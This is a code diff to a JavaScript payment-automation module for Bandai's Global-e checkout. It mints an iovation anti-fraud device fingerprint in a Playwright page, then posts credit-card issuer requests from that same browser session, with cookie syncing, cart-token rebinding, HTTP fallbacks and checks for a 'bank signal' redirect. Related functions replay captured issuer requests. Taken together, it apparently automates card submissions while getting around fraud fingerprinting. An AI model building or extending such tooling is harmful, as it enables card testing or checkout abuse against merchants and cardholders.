@@ -595,6 +595,90 @@ export function buildIssuerFormBody(opts = {}) {
 }
 
 /**
+ * POST issuer from the Playwright page that minted iovation — same cookies/TLS
+ * as #ioBlackBox. Undici POST after cross-context mint often returns
+ * DataCorruption / IsTheSameCartToken=False (Revolut silent).
+ */
+export async function postBandaiGeIssuerViaPage(opts = {}) {
+  const page = opts.page;
+  const url = String(opts.url || "");
+  const body = String(opts.body || "");
+  if (!page) return { ok: false, error: "page_required", via: "page-ge-issuer" };
+  if (!isBandaiGeIssuerPaymentUrl(url)) {
+    return { ok: false, error: "not_issuer_url", via: "page-ge-issuer" };
+  }
+  if (!body) return { ok: false, error: "body_required", via: "page-ge-issuer" };
+  const t0 = Date.now();
+  try {
+    const result = await page.evaluate(
+      async ({ url: u, body: b, referer, contentType }) => {
+        const res = await fetch(u, {
+          method: "POST",
+          headers: {
+            accept: "text/html,application/xhtml+xml,application/json,*/*",
+            "content-type": contentType || "application/x-www-form-urlencoded; charset=UTF-8",
+            origin: "https://secure-bandai.global-e.com",
+            referer: referer || "https://secure-bandai.global-e.com/payments/CreditCardForm/",
+          },
+          body: b,
+          redirect: "manual",
+          credentials: "include",
+        });
+        const text = await res.text().catch(() => "");
+        return {
+          status: res.status,
+          location: res.headers.get("location") || "",
+          type: res.type,
+          bodySnippet: String(text || "").replace(/\s+/g, " ").slice(0, 240),
+        };
+      },
+      {
+        url,
+        body,
+        referer: opts.referer || null,
+        contentType: opts.contentType || null,
+      },
+    );
+    const redirectUrl = result.location || null;
+    const isPaymentRedirect = /CCPaymentRedirect/i.test(String(redirectUrl || ""));
+    const redirectPayload = isPaymentRedirect
+      ? decodeCcPaymentRedirectData(redirectUrl)
+      : null;
+    const bankSignal = isBandaiGePaymentRedirectSignal(redirectUrl || "", "");
+    const declineOnRedirect = false;
+    const ok = Boolean(isPaymentRedirect && bankSignal);
+    return {
+      ok,
+      status: result.status,
+      ms: Date.now() - t0,
+      bodySnippet: result.bodySnippet,
+      redirectUrl: redirectUrl ? String(redirectUrl).slice(0, 320) : null,
+      redirectUrlFull: redirectUrl,
+      redirectSnippet: null,
+      redirectPayload,
+      isPaymentRedirect,
+      reloadOnly: Boolean(isPaymentRedirect && !bankSignal),
+      bankSignal,
+      declineOnRedirect,
+      sawAuthWire: Boolean(ok),
+      via: "page-ge-issuer",
+      error: ok
+        ? null
+        : isPaymentRedirect
+          ? "ge_reload_only_no_bank"
+          : "issuer_page_failed",
+    };
+  } catch (e) {
+    return {
+      ok: false,
+      error: e?.message || "issuer_page_failed",
+      ms: Date.now() - t0,
+      via: "page-ge-issuer",
+    };
+  }
+}
+
+/**
  * POST HandleCreditCardRequestV2 via undici (optional ctx jar/proxy).
  * Wire often returns 302 → CCPaymentRedirect?Data=JWT.
  * ReloadBehaviour-only JWTs are NOT bank hits (Revolut silent) — fail closed.
@@ -885,7 +969,7 @@ export async function runBandaiGeHttpPay(opts = {}) {
     };
   }
 
-  const guid = tokenOut.cartToken;
+  let guid = tokenOut.cartToken;
 
   const v2Url = `${BANDAI_GE_WEBSERVICES}/Checkout/v2/${encodedMerchant}/${guid}`;
   const v2 = await httpText(v2Url, {
@@ -965,6 +1049,7 @@ export async function runBandaiGeHttpPay(opts = {}) {
   // Mint iovation BEFORE CreditCardForm JWT. page.goto(Checkout/v2) refreshes
   // GE cookies — scraping JWT first then minting caused DataCorruption /
   // IsTheSameCartToken=False on issuer (Revolut silent).
+  let issuerPage = null;
   if (!machineId && opts.page) {
     const mint = await mintIovationBlackbox({
       page: opts.page,
@@ -988,30 +1073,77 @@ export async function runBandaiGeHttpPay(opts = {}) {
         /* ignore */
       }
     }
+    issuerPage = opts.page;
+    // Re-bind guid if Playwright landed on a different CartToken.
+    try {
+      const pageGuid =
+        extractGeCheckoutGuid(opts.page.url()) ||
+        extractGeCheckoutGuid(await opts.page.content());
+      if (pageGuid && pageGuid !== guid) {
+        push("ge_cart_token_rebind", {
+          ok: true,
+          status: null,
+          ms: 0,
+          note: `page guid ${pageGuid} (was ${guid})`,
+        });
+        guid = pageGuid;
+      }
+    } catch {
+      /* ignore */
+    }
   }
 
   // Wire-proven Revolut issuer used gatewayId=2 + paymentMethodId=2.
   const paymentMethodId = String(opts.paymentMethodId || "2");
   const gatewayId = String(opts.gatewayId || form.gatewayId || "2");
-  const ccUrl = `${BANDAI_GE_SECURE}/payments/CreditCardForm/${guid}/${paymentMethodId}`;
-  const cc = await httpText(ccUrl, {
-    ctx,
-    userAgent: opts.userAgent,
-    accept: "text/html,application/xhtml+xml,*/*",
-    headers: { referer: v2Url },
-  });
+  // Prefer loading CreditCardForm in the same Playwright context that minted
+  // iovation so JWT + machineId + cookies share one GE session.
+  let ccUrl = `${BANDAI_GE_SECURE}/payments/CreditCardForm/${guid}/${paymentMethodId}`;
+  let cc = { ok: false, status: 0, ms: 0, text: "" };
+  if (issuerPage) {
+    const tCc = Date.now();
+    try {
+      await syncJarToPage(issuerPage, ctx?.jar);
+      await issuerPage.goto(ccUrl, {
+        waitUntil: "domcontentloaded",
+        timeout: Math.min(45_000, Number(opts.iovationTimeoutMs) || 20_000),
+      });
+      const text = await issuerPage.content();
+      cc = { ok: true, status: 200, ms: Date.now() - tCc, text };
+      const pageCookies = await cookiesFromPage(issuerPage);
+      if (pageCookies && ctx?.jar?.load) {
+        ctx.jar.load({ ...ctx.jar.dump(), ...pageCookies });
+      }
+    } catch (e) {
+      cc = {
+        ok: false,
+        status: 0,
+        ms: Date.now() - tCc,
+        text: "",
+        error: e?.message || "cc_form_page_failed",
+      };
+    }
+  }
+  if (!cc.ok || !extractUrlStructureToken(cc.text)) {
+    const httpCc = await httpText(ccUrl, {
+      ctx,
+      userAgent: opts.userAgent,
+      accept: "text/html,application/xhtml+xml,*/*",
+      headers: { referer: v2Url },
+    });
+    if (!cc.ok || extractUrlStructureToken(httpCc.text)) cc = httpCc;
+  }
   // Always prefer JWT + machineId from the same CreditCardForm response
   // (after iovation cookie sync). Mixing Playwright blackbox with an older
   // JWT was one DataCorruption / IsTheSameCartToken=False path.
   urlStructureToken = extractUrlStructureToken(cc.text) || urlStructureToken;
   const formMachineId = extractMachineId(cc.text);
   if (formMachineId) machineId = formMachineId;
-  else if (!machineId) machineId = null;
   push("ge_credit_card_form", {
     ok: cc.ok,
     status: cc.status,
     ms: cc.ms,
-    note: `CreditCardForm ${cc.status}; jwt=${Boolean(urlStructureToken)} machineId=${Boolean(machineId)} midSrc=${formMachineId ? "form" : machineId ? "iovation" : "none"} pm=${paymentMethodId} gw=${gatewayId} bytes=${(cc.text || "").length}`,
+    note: `CreditCardForm ${cc.status}; jwt=${Boolean(urlStructureToken)} machineId=${Boolean(machineId)} midSrc=${formMachineId ? "form" : machineId ? "iovation" : "none"} via=${issuerPage && cc.ok ? "page" : "http"} pm=${paymentMethodId} gw=${gatewayId} bytes=${(cc.text || "").length}`,
   });
 
   try {
@@ -1114,13 +1246,39 @@ export async function runBandaiGeHttpPay(opts = {}) {
     gatewayId,
     paymentMethodId,
   });
-  const issuer = await postBandaiGeIssuerHttp({
-    url: issuerUrl,
-    body,
-    ctx,
-    userAgent: opts.userAgent,
-    referer: ccUrl,
-  });
+  // Prefer Playwright fetch (same TLS/cookies as iovation) when page is live.
+  let issuer =
+    issuerPage && opts.preferHttpIssuer !== true
+      ? await postBandaiGeIssuerViaPage({
+          page: issuerPage,
+          url: issuerUrl,
+          body,
+          referer: ccUrl,
+        })
+      : null;
+  if (!issuer || (issuer.error === "issuer_page_failed" && !issuer.isPaymentRedirect)) {
+    const httpIssuer = await postBandaiGeIssuerHttp({
+      url: issuerUrl,
+      body,
+      ctx,
+      userAgent: opts.userAgent,
+      referer: ccUrl,
+    });
+    if (!issuer || httpIssuer.bankSignal || (!issuer.ok && httpIssuer.ok)) {
+      issuer = httpIssuer;
+    } else if (!issuer.redirectPayload && httpIssuer.redirectPayload) {
+      issuer = httpIssuer;
+    }
+  }
+  if (!issuer) {
+    issuer = await postBandaiGeIssuerHttp({
+      url: issuerUrl,
+      body,
+      ctx,
+      userAgent: opts.userAgent,
+      referer: ccUrl,
+    });
+  }
 
   try {
     fs.writeFileSync(
@@ -1226,6 +1384,7 @@ export default {
   mintIovationBlackbox,
   loadIssuerCapture,
   postBandaiGeIssuerHttp,
+  postBandaiGeIssuerViaPage,
   replayCapturedIssuerHttp,
   runBandaiGeHttpPay,
   BANDAI_GE_MID,
